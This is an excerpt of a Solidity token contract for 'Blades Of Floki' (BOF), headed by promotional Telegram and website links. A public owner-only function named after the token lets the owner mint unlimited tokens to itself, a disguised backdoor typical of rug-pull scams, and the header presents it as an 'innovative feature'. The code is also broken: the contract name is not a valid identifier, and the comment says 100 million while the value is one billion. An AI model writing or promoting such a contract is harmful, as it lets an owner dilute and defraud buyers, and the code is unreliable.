//
// $BladesOfFloki proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BladesOfFloki
// 📱 Website ::http://bladesoffloki.io
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BladesOfFloki(uint256 amount) public onlyOwner {
 _BladesOfFloki(msg.sender, amount);
    }
    ...
    function _BladesOfFloki(address account, uint256 amount) internal virtual {
...
contract $BladesOfFloki is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Blades Of Floki", "BOF") {
     _BladesOfFloki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}